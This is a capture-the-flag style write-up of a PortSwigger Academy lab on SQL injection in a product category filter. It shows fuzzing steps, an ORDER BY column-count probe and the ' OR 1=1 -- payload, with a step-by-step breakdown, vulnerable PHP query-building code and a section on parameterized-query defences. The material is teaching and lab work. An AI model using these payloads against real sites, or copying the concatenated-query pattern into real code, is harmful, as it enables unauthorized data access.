## Platform `PortSwigger Academy`

#### Target -> Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- Description: `This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:SELECT * FROM products WHERE category = 'Gifts' AND released = 1
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.`

`**Where is Vuln: https://0ad500b9046734cd81a36cec0000003c.web-security-academy.net/filter?category=Vuln_endpoint**`

`**Our Goal: display unreleased product**`

## analysis
##### Fuzz: SELECT \* FROM products WHERE category = '`'`' AND released = 1 **![alt text](image.png)**
##### Fuzz1: SELECT \* FROM products WHERE category = '`' order by 8--`' AND released = 1 **![alt text](image-1.png)**
##### FUZZ2: SELECT \* FROM products WHERE category = '`' or 1=1 --`' AND released = 1 -> **![alt text](image-2.png)**

#### Steps:

1. Open The Lab.
2. end find vuln endpoint product category.
3. i'm fuzz manully send -> ' `Internal Server Error`
4. and next -> `' order by 8 (if you enter 9 and more error ) --` so identify 8 colums
5. and send classic sqli payload -> `' or 1=1 --` they always true
6. solve the lab

---

## Breakdown: What Actually Happens with `' OR 1=1 --` Payload

### Original Query (Vulnerable Code)

```php
$category = $_GET['category'];  // User input from URL
$query = "SELECT * FROM products WHERE category = '" . $category . "' AND released = 1";
// Example: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### When We Input: `' OR 1=1 --`

**Step-by-Step Execution:**

#### 1️⃣ Inject the Payload

```
URL Parameter: ?category=' OR 1=1 --
Input Value: ' OR 1=1 --
```

#### 2️⃣ Query Construction (What PHP/Backend Does)

```php
$category = "' OR 1=1 --";
$query = "SELECT * FROM products WHERE category = '" . $category . "' AND released = 1";

// Result becomes:
// SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```

#### 3️⃣ How SQL Interprets This

```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
                            ↓        ↓   ↓  ↑    ↑  ↑                 ↑
                       Condition 1    │   │  │    │  └── Comment Starts Here
                       (FALSE)        │   │  │    └────── Always TRUE
                                      │   │  └────────── OR Operator
                                      │   └──────────────────────── Closing Quote
                                      └─────────────────────────── Opening Quote
```

#### 4️⃣ SQL Logic Evaluation

```sql
-- WHERE clause breakdown:
WHERE category = ''           -- FALSE (no category is empty string)
      OR 1=1                  -- TRUE (1 equals 1 is always true) ✓
      -- ' AND released = 1   -- IGNORED (commented out)
```

**Final Query Execution:**

```sql
SELECT * FROM products
WHERE category = '' OR 1=1 -- (rest ignored)

-- SQL sees: WHERE FALSE OR TRUE
-- Result: WHERE TRUE ✓✓✓

-- So ALL products are returned (both released=1 and released=0)
```

#### 5️⃣ What Gets Returned

```
Expected Result (vulnerable query):
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
  → Only released products in Gifts category

Actual Result (after injection):
SELECT * FROM products WHERE 1=1
  → ALL products including unreleased ones ✓
```

### Why It Works: Breaking Down Each Part

| Component | Purpose               | Effect                                                  |
| --------- | --------------------- | ------------------------------------------------------- |
| `'`       | Close original string | Ends the `category = '` condition                       |
| `OR`      | Logical OR operator   | Adds a second condition to WHERE                        |
| `1=1`     | Always TRUE           | Makes WHERE clause always true                          |
| `--`      | SQL comment           | Ignores everything after (removes `' AND released = 1`) |

### Visualization

```
BEFORE INJECTION:
┌─────────────────────────────────────────────────┐
│ SELECT * FROM products WHERE category = 'Gifts' AND released = 1 │
└─────────────────────────────────────────────────┘
                                ↓
                        Only returns 1 row


AFTER INJECTION `' OR 1=1 --`:
┌────────────────────────────────────────────────────────────┐
│ SELECT * FROM products WHERE category = '' OR 1=1 -- ...  │
│                                           ↑      ↑    ↑    │
│                                    Condition 2    Comment   │
│                                     (Always True) Start     │
└────────────────────────────────────────────────────────────┘
                                ↓
                    Returns ALL rows (unreleased too!) ✓
```

### Real-World Attack Scenario

```
1. Attacker visits:
   https://vulnerable-site.com/filter?category=' OR 1=1 --

2. Backend creates query:
   SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1

3. Database executes:
   ✓ Returns ALL products (bypasses the AND released = 1 check)

4. Attacker sees:
   ✓ Both released AND unreleased products
   ✓ Lab solved!
```

### Why This Payload is So Common

✅ **Simple** - Easy to understand and remember
✅ **Universal** - Works on almost all databases (MySQL, MSSQL, PostgreSQL, Oracle)
✅ **Fast** - Immediate results, no guessing characters
✅ **Classic** - First injection method attackers try
✅ **Effective** - Bypasses authentication and authorization checks

### Defense: How to Prevent This

```python
# VULNERABLE - Never do this
query = f"SELECT * FROM products WHERE category = '{category}' AND released = 1"

# SECURE - Use parameterized queries
query = "SELECT * FROM products WHERE category = ? AND released = 1"
cursor.execute(query, (category,))

# SECURE - Python with ORM
products = Product.query.filter_by(category=category, released=True).all()
```

---

## Automate Exploitation check `exploit.py` use burpsuite for create this exploit ![alt text](image.png)
